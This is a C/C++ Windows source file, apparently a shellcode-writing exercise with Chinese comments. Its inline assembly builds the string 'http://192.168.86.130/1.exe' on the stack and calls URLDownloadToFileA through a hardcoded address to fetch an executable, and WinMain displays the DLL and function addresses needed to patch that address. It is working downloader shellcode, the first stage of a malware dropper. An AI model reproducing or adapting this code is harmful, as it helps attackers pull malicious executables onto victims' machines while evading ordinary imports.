// char* url = "http://192.168.86.130/1.exe";
// filename = "1.exe";

#include <stdio.h> 
#include <Windows.h>
#include<string>


//硬编码 URLDownloadToFileA的函数地址  执行文件下载
void test()
{
	_asm
	{
		push ebp
		mov  ebp, esp

		;传入参数 调用函数  其中字符串的位置是硬编码 函数合并时 需要重新考虑
		mov ebx, 0x00000065;000e
		push ebx;
		mov ebx, 0x78652e31; 31 2e 65 78 1.ex
		push ebx

		xor ebx,ebx
		lea ebx,[esp]

		mov ebx, 0x00657865;exe
		push ebx
		mov ebx, 0x2e312f30;0/1.
		push ebx
		mov ebx, 0x33312e36;31.6
		push ebx
		mov ebx, 0x382e3836;8.86
		push ebx
		mov ebx, 0x312e3239;1.29
		push ebx
		mov ebx, 0x312f2f3a;1//:
		push ebx
		mov ebx, 0x70747468
		push ebx

		xor ebx,ebx
		lea ebx,[esp]

		push 0
		push 0
		xor ebx,ebx
		lea ebx,[esp+24h]
		push ebx

		xor ebx,ebx
		lea ebx,[esp+0ch]
		push ebx

		push 0
		mov ebx,0x6f8241c0   ;函数地址自行修改 调用下载文件 call函数会自己清理参数
		call ebx


		; 恢复堆栈
		add esp, 0x24; 自己清除堆栈
		pop ebp
	}

}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
	PSTR szCmdLine, int iCmdShow)

{
	//MessageBox(NULL, String(233), TEXT("打招呼"), MB_CANCELTRYCONTINUE);

	HINSTANCE LibHandle = LoadLibrary("Urlmon.dll"); //要获取DLL的内存地址
	char str[25];
	itoa((int)LibHandle, str, 16);
	MessageBox(NULL, (LPCSTR)str, TEXT("打招呼"), MB_CANCELTRYCONTINUE);

	
	LPTSTR getaddr = (LPTSTR)GetProcAddress(LibHandle, "URLDownloadToFileA"); //获取DLL中导出函数地址

	itoa((int)getaddr, str, 16);
	MessageBox(NULL, (LPCSTR)str, TEXT("打招呼"), MB_CANCELTRYCONTINUE);
																			 
    //printf("system Address = 0x % x \n", getaddr);


	test();
	return 0;
}




